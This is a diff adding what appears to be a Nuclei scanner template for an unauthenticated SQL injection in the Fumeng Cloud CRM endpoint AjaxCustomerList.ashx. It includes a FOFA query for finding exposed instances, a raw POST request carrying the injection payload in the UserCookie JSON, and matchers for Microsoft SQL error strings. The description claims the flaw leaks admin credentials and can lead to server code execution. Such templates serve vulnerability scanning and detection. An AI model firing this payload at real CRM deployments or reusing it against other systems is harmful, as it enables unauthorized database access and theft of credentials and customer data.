@@ -1,0 +1,30 @@
+id: fumeng-cloud-crm-ajaxcustomerlist-cookie-sqli
+
+info:
+  name: 孚盟云CRM AjaxCustomerList.ashx 接口Cookie参数SQL注入漏洞
+  author: 0dayPoc
+  severity: high
+  description: |-
+    fofa: app="孚盟软件-孚盟云"
+          上海孚盟软件有限公司作为外贸SaaS服务提供商，其孚盟云产品中的AjaxCustomerList.ashx接口在Cookie参数处理过程中存在SQL注入缺陷。攻击者可利用该漏洞在未认证状态下执行恶意SQL查询，导致数据库敏感信息泄露（包括但不限于管理员后台凭证、用户隐私数据）。在具备特定权限条件下，攻击者可能通过注入链实现服务器端代码执行，进而获取系统控制权。
+  tags: 孚盟云CRM
+
+http:
+- raw:
+  - |
+    POST /m/Dingding/Ajax/AjaxCustomerList.ashx HTTP/1.1
+    Host: {{Hostname}}
+    Cookie: UserCookie={"empId":"')-1/@@VERSION--"}
+    Content-Type: application/x-www-form-urlencoded
+
+    method=showFocused
+  matchers-condition: and
+  matchers:
+  - type: status
+    status: [500]
+  - type: word
+    part: body
+    words:
+      - 'Microsoft SQL'
+      - "nvarchar"
+    condition: and
